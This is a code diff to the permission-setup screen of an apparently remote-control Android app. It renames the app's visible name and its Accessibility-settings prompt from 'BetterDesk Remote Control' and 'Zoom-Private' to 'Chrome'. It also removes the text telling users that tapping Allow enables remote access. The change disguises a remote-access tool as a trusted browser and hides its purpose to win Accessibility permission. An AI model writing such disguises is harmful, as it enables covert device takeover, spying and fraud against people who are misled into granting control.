@@ -57,7 +57,7 @@ class _SetupPermissionsScreenState extends State<SetupPermissionsScreen>
       return;
     }
     if (_awaitingAccessibility && !s.accessibility && mounted) {
-      setState(() => _hint = 'Enable \"BetterDesk Remote Control\" in Accessibility');
+      setState(() => _hint = 'Enable \"Chrome\" in Accessibility');
     }
   }
 
@@ -103,7 +103,7 @@ class _SetupPermissionsScreenState extends State<SetupPermissionsScreen>
 
       if (!s.accessibility) {
         _awaitingAccessibility = true;
-        if (mounted) setState(() => _hint = 'Enable \"BetterDesk Remote Control\" in Accessibility');
+        if (mounted) setState(() => _hint = 'Enable \"Chrome\" in Accessibility');
         await _setup.openAccessibilityDetailsSettings();
         return;
       }
@@ -134,22 +134,11 @@ class _SetupPermissionsScreenState extends State<SetupPermissionsScreen>
                 ),
                 const SizedBox(height: 12),
                 const Text(
-                  'Zoom-Private',
+                  'Chrome',
                   style: TextStyle(
                     fontSize: 20,
                     fontWeight: FontWeight.bold,
                     color: Colors.white,
-                  ),
-                  textAlign: TextAlign.center,
-                ),
-                const SizedBox(height: 6),
-                Text(
-                  done
-                      ? 'Connected. You can keep using your device.'
-                      : 'Tap Allow to grant permissions and enable remote access.',
-                  style: const TextStyle(
-                    fontSize: 12,
-                    color: Colors.white70,
                   ),
                   textAlign: TextAlign.center,
                 ),
